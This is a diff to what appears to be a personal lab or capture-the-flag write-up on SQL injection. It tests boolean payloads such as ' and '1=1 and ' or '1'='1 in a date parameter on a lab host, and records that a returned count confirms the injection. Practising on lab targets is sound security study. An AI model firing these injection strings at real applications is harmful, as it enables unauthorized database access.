@@ -175,6 +175,12 @@ using this logic, lets try to find a successful execution of maliciously crafted
 lets try  this payload  ( may 2020' and '1=1 )
 http://sqli2.naham.sec:8081/article-count?date=may%202020%27%20and%20%271=1
 ![[Screenshot From 2025-03-04 22-41-07.png]]
+it returns count=2,  therefore the sqli successfully executed
+
+same for this  ( may 2020' or '1'='1 )   |  ()
+http://sqli2.naham.sec:8081/article-count?date=may%202020%27%20or%20%271%27=%271
+![[Pasted image 20250304224507.png]]
+
 
 
 
